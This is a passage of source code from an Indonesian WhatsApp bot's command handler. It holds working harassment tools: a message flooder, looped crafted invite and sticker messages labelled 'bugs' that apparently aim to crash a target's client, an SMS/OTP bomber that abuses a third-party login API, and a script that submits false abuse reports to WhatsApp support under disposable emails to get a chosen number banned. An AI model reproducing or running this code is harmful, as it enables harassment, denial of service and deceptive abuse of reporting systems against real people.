  'Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia',
  'Aku tidak pernah berpikir kamu akan menjadi yang sementara',
  'Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah',
  'Jangan paksa aku menjadi cewek seperti seleramu',
  'Hanya yang sabar yang mampu melewati semua kekecewaan',
  'Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri',
  'Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu',
  'Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu',
  'Punya kalimat sendiri & mau ditambahin? chat *.owner*'
]
const galaunya = galau[Math.floor(Math.random() * galau.length)]
reply(`${galaunya}`)
backsoundnya = fs.readFileSync('./media/sound/galau.mp3')
HuBotZ.sendMessage(m.chat, {audio: backsoundnya, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'santet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': {
 if (!isCreator) return reply(mess.OnlyOwner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
if (args[0].startsWith(ownerNumber)) return reply('Ngapain Mau Kirim Ke Owner? Lu Mau Gw Spam?')
reply('Proses Ngab') 
HuBotZ.sendMessage(Pe, {text: `Punten Goput`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `Tess Bang`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `Uhuyyyy`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `Slebeww`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `Anjayy`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `Sikatt Mangg`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
HuBotZ.sendMessage(Pe, {text: `${global.botname}`}, {quoted:HuBotZa})
await sleep(2000)
}
reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'buglink':
if (!isCreator) return
jumlah = `25`
ydd = `*HuBotZ MD*`
for (let i = 0; i < jumlah; i++) {
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "6288239620884-1626256984@g.us",
"inviteCode": "sfeVFOlWvlo5Hd9x",
"inviteExpiration": "166659839399999",
"groupName": `𝑪𝑶𝑴𝑼𝑵𝑰𝑻𝒀 𝑪𝑳𝑨𝒀(𝑪𝒍𝒐𝒘𝒏𝒔 𝑳𝒂𝒖𝒈𝒉 𝑨𝒕 𝒀𝒐𝒖)©️${ngazap(prefix)}`,
"jpegThumbnail": "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",
"caption": `*https://wa.me/settings*\n_*DAVID XD*_${ngazap(prefix)}`,
}
}), { userJid: m.chat, quoted: m })
HuBotZ.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'bugs':
if (!isCreator) return
if (args.length == 0) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `*HuBotZ MD*`
for (let i = 0; i < jumlah; i++) {
HuBotZ.sendMessage(m.chat, {sticker: {url: `${global.thumb}`}},{'quoted': {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'spams': {
if (!isCreator) return reply('*khusus Owner*')
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
if (froms.startsWith('+6285600793871')) return reply('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS)`);
});
}
} else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6281214281312`)
reply(`spam sms/call akan di kirim ke no target`)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'banned': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=20")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `I noticed that a user was using modified whatsapp, so i ask support to ban this account for violating terms of service, and the account uses a WhatsApp bot that can send malicious messages so that other users' WhatsApp cannot work
Number : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp!`)
await sleep(5000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'unbanned': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aku Tidak Tau Mengapa Nomor Saya Tiba Tiba Di Larang Dari Menggunakan WhatsApp Aku Hanya Membalas Pesan Customer Saya Mohon Buka Larangan Akun WhatsApp Saya: [+${targetnya}]
Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
//=================================================
case 'unbannedv2': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Pihak WhatsApp yang terhormat mohon bantuan anda segera
[${targetnya}]
Saya telah mengirim beberapa email dan laporan ke pihak WhatsApp untuk mengajukan banding agar nomor saya cepat di buka dari daftar blokir, saya sangat membutuhkan untuk keperluan pribadi berkomunikasi dengan keluarga jika saya melakukan pelanggaran sebelumnya maka saya akan menggunakan nomor saya tersebut dengan lebih hati-hati dan lebih baik lagi dari sebelumnya dan saya sekarang telah menuruti apa yang pihak WhatsApp sarankan, dan saya sangat berharap sekarang juga nomor saya dapat di gunakan kembali. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
